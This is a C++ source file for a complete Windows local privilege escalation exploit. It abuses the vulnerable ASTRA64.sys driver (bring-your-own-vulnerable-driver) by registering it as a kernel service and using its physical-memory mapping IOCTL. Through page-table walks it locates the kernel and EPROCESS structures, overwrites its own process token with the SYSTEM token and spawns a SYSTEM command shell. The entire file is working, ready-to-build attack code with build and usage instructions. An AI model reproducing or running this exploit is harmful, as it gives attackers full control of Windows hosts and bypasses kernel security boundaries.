/*
 * astra64_lpe.cpp  —  LPE via ASTRA64.sys (TVicHW / EnTech Taiwan)
 *
 * Based on: https://github.com/BlackSnufkin/BYOVD/tree/main/Astra64-RW
 *
 * Primitive : IOCTL_MAP_PHYS (0x80002008) maps \Device\PhysicalMemory pages.
 *
 * Technique : Direct DKOM token swap via physical write.
 *   - No SSDT hijack, no gadget, no race condition.
 *   - Translate EPROCESS.Token VA → PA, write System token directly.
 *   - EPROCESS is non-paged global kernel memory → accessible via system CR3.
 *
 * Build  : build.bat (MSVC x64, /std:c++17)
 * Usage  : astra64_lpe.exe [C:\path\to\ASTRA64.sys]
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

// ─── Constants ───────────────────────────────────────────────────────────────
#define IOCTL_MAP_PHYS   0x80002008u
#define IOCTL_READ_MSR   0x800020ECu
#define DEVICE_PATH      "\\\\.\\Astra32Device0"
#define SERVICE_NAME     "ASTRA64"
#define IA32_LSTAR       0xC0000082u
#define KUSD_VA          0xFFFFF78000000000ULL
#define EX_FAST_REF_MASK 0xFULL

static bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

#pragma pack(push,1)
struct MAP_INPUT {
    uint32_t interface_type;
    uint32_t bus_number;
    uint64_t physical_addr;
    uint32_t address_space;
    uint32_t size;
};
#pragma pack(pop)

// ─────────────────────────────────────────────────────────────────────────────
//  Astra device wrapper
// ─────────────────────────────────────────────────────────────────────────────
struct Astra {
    HANDLE   dev     = INVALID_HANDLE_VALUE;
    uint64_t hint_hi = 0;

    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ|GENERIC_WRITE,
                          FILE_SHARE_READ|FILE_SHARE_WRITE,
                          NULL, OPEN_EXISTING, 0, NULL);
        return dev != INVALID_HANDLE_VALUE;
    }
    void close() {
        if (dev != INVALID_HANDLE_VALUE) { CloseHandle(dev); dev = INVALID_HANDLE_VALUE; }
    }

    bool read_msr(uint32_t idx, uint64_t *out) {
        uint8_t io[8] = {}; memcpy(io, &idx, 4);
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_READ_MSR, io, 4, io, 8, &ret, NULL)) return false;
        memcpy(out, io, 8); return true;
    }

    // Map one 4 KB physical page; recover upper 32 bits via hint_hi cache.
    uintptr_t map_page(uint64_t phys_page) {
        MAP_INPUT inp = {}; inp.physical_addr = phys_page; inp.size = 0x1000;
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_MAP_PHYS,
                             &inp, sizeof(inp), &inp, sizeof(inp), &ret, NULL))
            return 0;
        uint64_t lo = (uint64_t)(uint32_t)inp.interface_type;
        if (!lo) return 0;

        auto try_hi = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | lo;
            MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand, &mbi, sizeof(mbi)) > 0
                    && mbi.State == MEM_COMMIT) ? (uintptr_t)cand : 0;
        };
        if (auto va = try_hi(hint_hi)) return va;
        for (uint64_t hi = 0; hi < 0x8000; hi++) {
            if (hi == hint_hi) continue;
            if (auto va = try_hi(hi)) { hint_hi = hi; return va; }
        }
        return 0;
    }

    void unmap(uintptr_t va) { UnmapViewOfFile((LPCVOID)(va & ~(uintptr_t)0xFFF)); }

    // HVCI-safe read via ReadProcessMemory (avoids BSOD on EPT-protected pages).
    static bool safe_copy(uintptr_t src, void *dst, size_t n) {
        SIZE_T rd = 0;
        return ReadProcessMemory(GetCurrentProcess(),
                                 (LPCVOID)src, dst, n, &rd) && rd == n;
    }

    bool read_phys(uint64_t addr, void *buf, size_t len) {
        auto *dst = (uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF;
            size_t   off  = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page);
            if (!va) return false;
            bool ok = safe_copy(va + off, dst + pos, chunk);
            unmap(va);
            if (!ok) return false;
            pos += chunk; addr += chunk;
        }
        return true;
    }

    bool write_phys(uint64_t addr, const void *buf, size_t len) {
        auto *src = (const uint8_t *)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF;
            size_t   off  = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page);
            if (!va) return false;
            memcpy((void *)(va + off), src + pos, chunk);
            unmap(va);
            pos += chunk; addr += chunk;
        }
        return true;
    }

    bool read_u32(uint64_t pa, uint32_t *v) { return read_phys(pa, v, 4); }
    bool read_u64(uint64_t pa, uint64_t *v) { return read_phys(pa, v, 8); }
    bool write_u64(uint64_t pa, uint64_t  v) { return write_phys(pa, &v, 8); }
};

// ─────────────────────────────────────────────────────────────────────────────
//  4-level page-table walk + virtual R/W
// ─────────────────────────────────────────────────────────────────────────────
static bool virt_to_phys(Astra *d, uint64_t cr3, uint64_t va, uint64_t *pa) {
    auto idx = [&](int lvl) { return (va >> (12 + lvl*9)) & 0x1FF; };

    uint64_t pml4e = 0;
    if (!d->read_u64((cr3 & 0x000FFFFFFFFFF000ULL) + idx(3)*8, &pml4e) || !(pml4e&1)) return false;

    uint64_t pdpte = 0;
    if (!d->read_u64((pml4e & 0x000FFFFFFFFFF000ULL) + idx(2)*8, &pdpte) || !(pdpte&1)) return false;
    if (pdpte & 0x80) { *pa = (pdpte & 0x000FFFFC0000000ULL) | (va & 0x3FFFFFFFULL); return true; }

    uint64_t pde = 0;
    if (!d->read_u64((pdpte & 0x000FFFFFFFFFF000ULL) + idx(1)*8, &pde) || !(pde&1)) return false;
    if (pde & 0x80)  { *pa = (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL); return true; }

    uint64_t pte = 0;
    if (!d->read_u64((pde & 0x000FFFFFFFFFF000ULL) + idx(0)*8, &pte) || !(pte&1)) return false;

    *pa = (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
    return true;
}

static bool vread(Astra *d, uint64_t cr3, uint64_t va, void *buf, size_t len) {
    auto *dst = (uint8_t *)buf;
    for (size_t pos = 0; pos < len; ) {
        size_t   off   = (size_t)(va & 0xFFF);
        size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
        uint64_t pa;
        if (!virt_to_phys(d, cr3, va, &pa)) return false;
        if (!d->read_phys(pa, dst + pos, chunk)) return false;
        pos += chunk; va += chunk;
    }
    return true;
}

static bool vread_u64(Astra *d, uint64_t cr3, uint64_t va, uint64_t *v) {
    return vread(d, cr3, va, v, 8);
}

// ─────────────────────────────────────────────────────────────────────────────
//  CR3 discovery — scan low 64 MB for PML4 that maps KUSD correctly
// ─────────────────────────────────────────────────────────────────────────────
static uint64_t find_cr3(Astra *d) {
    const uint64_t kusd_idx = (KUSD_VA >> 39) & 0x1FF;
    printf("[*] Scanning low 64 MB for CR3 (KUSD PML4 idx 0x%llX)...\n",
           (unsigned long long)kusd_idx);

    std::vector<uint64_t> cands;
    for (uint64_t pg = 0; pg < 0x4000000ULL; pg += 0x1000) {
        uint64_t e = 0;
        if (!d->read_u64(pg + kusd_idx * 8, &e)) continue;
        if (!(e & 1)) continue;
        if ((e & 0x000FFFFFFFFFF000ULL) > 0x80000000ULL) continue;
        cands.push_back(pg);
    }
    printf("[*] %zu candidates, verifying...\n", cands.size());
    for (uint64_t cr3 : cands) {
        uint64_t pa;
        if (!virt_to_phys(d, cr3, KUSD_VA, &pa)) continue;
        uint32_t v = 0;
        if (d->read_u32(pa + 0x26C, &v) && v == 10)
            return cr3;
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  ntoskrnl base — MZ walk-back from LSTAR
// ─────────────────────────────────────────────────────────────────────────────
static uint64_t find_kernel_base(Astra *d, uint64_t cr3, uint64_t lstar) {
    uint64_t addr = lstar & ~(uint64_t)0xFFF;
    for (uint64_t i = 0; i < 0x4000; i++, addr -= 0x1000) {
        if (!is_kptr(addr)) break;
        uint8_t hdr[0x200] = {};
        if (!vread(d, cr3, addr, hdr, sizeof(hdr))) continue;
        if (hdr[0] != 'M' || hdr[1] != 'Z') continue;
        uint32_t lfn = *(uint32_t *)(hdr + 0x3C);
        if ((size_t)lfn + 0x54 > sizeof(hdr)) continue;
        if (memcmp(hdr + lfn, "PE\0\0", 4)) continue;
        if (*(uint16_t *)(hdr + lfn + 4)  != 0x8664) continue;
        if (*(uint16_t *)(hdr + lfn + 24) != 0x020B) continue;
        uint32_t sz = *(uint32_t *)(hdr + lfn + 0x50);
        if (sz < 0x100000 || addr + sz <= lstar) continue;
        return addr;
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Disk PE helpers (DONT_RESOLVE_DLL_REFERENCES)
// ─────────────────────────────────────────────────────────────────────────────
static uintptr_t load_image(const char *name) {
    return (uintptr_t)LoadLibraryExA(name, NULL, DONT_RESOLVE_DLL_REFERENCES);
}

static uint64_t export_rva(uintptr_t base, const char *name) {
    FARPROC p = GetProcAddress((HMODULE)base, name);
    return p ? (uint64_t)((uintptr_t)p - base) : 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  EPROCESS offsets + walk
// ─────────────────────────────────────────────────────────────────────────────
struct EpOff { uint64_t pid, links, token; };

static EpOff detect_ep_offsets() {
    typedef NTSTATUS (NTAPI *fn)(PRTL_OSVERSIONINFOW);
    auto f = (fn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    RTL_OSVERSIONINFOW ov = {}; ov.dwOSVersionInfoSize = sizeof(ov);
    if (f) f(&ov);
    DWORD b = ov.dwBuildNumber;
    printf("[*] Build: %lu\n", b);
    if (b >= 26100) return { 0x1D0, 0x1D8, 0x248 };
    return              { 0x440, 0x448, 0x4B8 };   // 19041..26099
}

// Walk EPROCESS list using PsInitialSystemProcess from disk ntoskrnl.
// Returns sys_ep (System, PID 4) and tgt_ep (our process).
static bool find_eprocess(Astra *d, uint64_t cr3,
                           uint64_t nt_kbase, uintptr_t nt_disk,
                           const EpOff &ep, uint32_t tgt_pid,
                           uint64_t *sys_ep, uint64_t *tgt_ep) {
    uint64_t rva = export_rva(nt_disk, "PsInitialSystemProcess");
    if (!rva) { printf("[-] PsInitialSystemProcess not found\n"); return false; }

    uint64_t se = 0;
    if (!vread_u64(d, cr3, nt_kbase + rva, &se) || !is_kptr(se)) {
        printf("[-] *PsInitialSystemProcess invalid\n"); return false;
    }
    uint64_t spid = 0; vread_u64(d, cr3, se + ep.pid, &spid);
    if (spid != 4) { printf("[-] System PID = %llu\n", (unsigned long long)spid); return false; }
    *sys_ep = se;

    if (tgt_pid == 4) { *tgt_ep = se; return true; }

    // Blink of System.ActiveProcessLinks = PsActiveProcessHead
    uint64_t head = 0, flink = 0;
    if (!vread_u64(d, cr3, se + ep.links + 8, &head) || !is_kptr(head)) {
        printf("[-] PsActiveProcessHead invalid\n"); return false;
    }
    if (!vread_u64(d, cr3, head, &flink)) return false;

    for (int i = 0; i < 4096 && flink != head; i++) {
        uint64_t ep_va = flink - ep.links;
        uint64_t pid   = 0;
        if (vread_u64(d, cr3, ep_va + ep.pid, &pid) && (uint32_t)pid == tgt_pid) {
            *tgt_ep = ep_va; return true;
        }
        uint64_t nxt = 0;
        if (!vread_u64(d, cr3, flink, &nxt) || !is_kptr(nxt)) break;
        flink = nxt;
    }
    printf("[-] PID %u not found\n", tgt_pid);
    return false;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Driver registration
// ─────────────────────────────────────────────────────────────────────────────
static bool register_driver(const char *path) {
    SC_HANDLE mgr = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!mgr) return false;
    SC_HANDLE s = OpenServiceA(mgr, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (s) { DeleteService(s); CloseServiceHandle(s); }
    s = CreateServiceA(mgr, SERVICE_NAME, SERVICE_NAME,
                       SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                       SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                       path, NULL, NULL, NULL, NULL, NULL);
    if (!s) { CloseServiceHandle(mgr); return false; }
    BOOL ok = StartService(s, 0, NULL);
    DWORD e  = GetLastError();
    CloseServiceHandle(s); CloseServiceHandle(mgr);
    return ok || e == ERROR_SERVICE_ALREADY_RUNNING;
}

// ─────────────────────────────────────────────────────────────────────────────
//  main
// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char **argv) {
    printf("\n  [~] astra64_lpe — DKOM token swap via ASTRA64.sys physical R/W\n\n");

    if (argc >= 2) {
        printf("[*] Registering: %s\n", argv[1]);
        if (!register_driver(argv[1]))
            printf("[!] Registration failed — continuing\n");
    }

    // ── 1. Open device ────────────────────────────────────────────────────────
    Astra drv;
    if (!drv.open()) {
        printf("[-] Cannot open %s: %lu\n", DEVICE_PATH, GetLastError());
        return 1;
    }
    printf("[+] Device opened: %s\n", DEVICE_PATH);

    // ── 2. LSTAR ──────────────────────────────────────────────────────────────
    uint64_t lstar = 0;
    if (!drv.read_msr(IA32_LSTAR, &lstar) || !is_kptr(lstar)) {
        printf("[-] MSR_LSTAR read failed: %lu\n", GetLastError()); return 1;
    }
    printf("[+] IA32_LSTAR = 0x%llX\n", (unsigned long long)lstar);

    // ── 3. System CR3 ─────────────────────────────────────────────────────────
    uint64_t cr3 = find_cr3(&drv);
    if (!cr3) { printf("[-] CR3 not found\n"); return 1; }
    printf("[+] CR3 = 0x%llX\n", (unsigned long long)cr3);

    // ── 4. ntoskrnl base ──────────────────────────────────────────────────────
    uint64_t nt_kbase = find_kernel_base(&drv, cr3, lstar);
    if (!nt_kbase) { printf("[-] ntoskrnl base not found\n"); return 1; }
    printf("[+] ntoskrnl = 0x%llX\n", (unsigned long long)nt_kbase);

    // ── 5. Load ntoskrnl disk image (for PsInitialSystemProcess export) ───────
    uintptr_t nt_disk = load_image("ntoskrnl.exe");
    if (!nt_disk) {
        printf("[-] LoadLibraryEx(ntoskrnl.exe): %lu\n", GetLastError()); return 1;
    }

    // ── 6. EPROCESS offsets ───────────────────────────────────────────────────
    EpOff ep = detect_ep_offsets();
    printf("[*] EPROCESS: pid=+0x%llX  links=+0x%llX  token=+0x%llX\n",
           (unsigned long long)ep.pid,
           (unsigned long long)ep.links,
           (unsigned long long)ep.token);

    // ── 7. Walk EPROCESS list ─────────────────────────────────────────────────
    uint32_t my_pid = GetCurrentProcessId();
    uint64_t sys_ep = 0, my_ep = 0;
    printf("[*] Walking EPROCESS (PID 4 and %u)...\n", my_pid);
    if (!find_eprocess(&drv, cr3, nt_kbase, nt_disk, ep, my_pid,
                       &sys_ep, &my_ep)) {
        printf("[-] EPROCESS walk failed\n"); return 1;
    }
    printf("[+] System EPROCESS = 0x%llX\n", (unsigned long long)sys_ep);
    printf("[+] Our    EPROCESS = 0x%llX\n", (unsigned long long)my_ep);

    // ── 8. Translate token VAs → physical addresses ───────────────────────────
    // EPROCESS is in non-paged global kernel pool → system CR3 works fine.
    uint64_t pa_sys_tok = 0, pa_my_tok = 0;
    if (!virt_to_phys(&drv, cr3, sys_ep + ep.token, &pa_sys_tok)) {
        printf("[-] virt_to_phys(System token) failed\n"); return 1;
    }
    if (!virt_to_phys(&drv, cr3, my_ep + ep.token, &pa_my_tok)) {
        printf("[-] virt_to_phys(Our token) failed\n"); return 1;
    }
    printf("[+] PA System token = 0x%llX\n", (unsigned long long)pa_sys_tok);
    printf("[+] PA Our    token = 0x%llX\n", (unsigned long long)pa_my_tok);

    // ── 9. Read current tokens ────────────────────────────────────────────────
    uint64_t sys_tok = 0, my_tok = 0;
    if (!drv.read_u64(pa_sys_tok, &sys_tok)) {
        printf("[-] Read System token failed\n"); return 1;
    }
    if (!drv.read_u64(pa_my_tok, &my_tok)) {
        printf("[-] Read Our token failed\n"); return 1;
    }
    printf("[+] System token = 0x%llX\n", (unsigned long long)sys_tok);
    printf("[+] Our    token = 0x%llX\n", (unsigned long long)my_tok);

    // ── 10. Write System token into our EPROCESS (direct physical write) ──────
    printf("[*] Writing System token to our EPROCESS...\n");
    if (!drv.write_u64(pa_my_tok, sys_tok)) {
        printf("[-] Token write failed\n"); return 1;
    }

    // ── 11. Verify ────────────────────────────────────────────────────────────
    uint64_t new_tok = 0;
    drv.read_u64(pa_my_tok, &new_tok);
    printf("[+] New token = 0x%llX\n", (unsigned long long)new_tok);

    drv.close();

    if ((new_tok & ~EX_FAST_REF_MASK) != (sys_tok & ~EX_FAST_REF_MASK)) {
        printf("[-] Token swap failed (values don't match)\n");
        return 1;
    }

    // ── 12. Check elevation ───────────────────────────────────────────────────
    bool elevated = false;
    {
        HANDLE tok;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) {
            TOKEN_ELEVATION te; DWORD sz = sizeof(te);
            if (GetTokenInformation(tok, TokenElevation, &te, sz, &sz))
                elevated = !!te.TokenIsElevated;
            CloseHandle(tok);
        }
    }
    printf("[%s] Elevation check: %s\n",
           elevated ? "+" : "-",
           elevated ? "ELEVATED" : "NOT elevated");

    // ── 13. Restore original token ────────────────────────────────────────────
    // Spawn shell first (while we're SYSTEM), then restore.
    printf("[+] Token swap OK — spawning SYSTEM shell...\n\n");
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    char cmd[] = "cmd.exe";
    BOOL spawned = CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                                  CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
    if (spawned) {
        printf("[+] SYSTEM cmd.exe spawned (PID %lu)\n", pi.dwProcessId);
        // Wait briefly so the shell inherits our elevated token context
        WaitForSingleObject(pi.hProcess, 2000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
    }

    // Restore our original token
    {
        // Re-open device to restore
        Astra drv2;
        if (drv2.open()) {
            // Re-translate (in case anything changed)
            uint64_t pa2 = 0;
            if (virt_to_phys(&drv2, cr3, my_ep + ep.token, &pa2))
                drv2.write_u64(pa2, my_tok);
            drv2.close();
            printf("[+] Original token restored\n");
        }
    }

    return spawned ? 0 : 1;
}
